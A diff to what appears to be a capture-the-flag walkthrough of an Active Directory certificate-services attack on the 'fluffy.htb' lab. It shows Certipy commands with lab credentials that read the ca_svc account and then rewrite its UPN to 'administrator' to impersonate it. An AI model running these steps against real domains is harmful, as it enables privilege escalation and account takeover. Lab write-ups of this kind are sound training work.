@@ -662,5 +662,26 @@ Lets try to exploit it
 
 **Step 1: Read initial UPN of the victim account**
 ```bash
-certipy account -u 'p.agile@fluffy.local' -p 'prometheusx-303' -dc-ip 10.10.11.69 -user 'Administrator' read
+certipy account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip 10.10.11.69 -user 'ca_svc' read
+```
+Output
+```bash
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Reading attributes for 'ca_svc':
+    cn                                  : certificate authority service
+    distinguishedName                   : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
+    name                                : certificate authority service
+    objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103
+    sAMAccountName                      : ca_svc
+    servicePrincipalName                : ADCS/ca.fluffy.htb
+    userPrincipalName                   : ca_svc@fluffy.htb
+    userAccountControl                  : 66048
+    whenCreated                         : 2025-04-17T16:07:50+00:00
+    whenChanged                         : 2025-07-01T00:55:32+00:00
+```
+
+We can see the SPN as ADCS, now we can change it to Administrator.
+```bash
+certipy account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip 10.10.11.69 -upn 'administrator' -user 'ca_svc' update
 ```
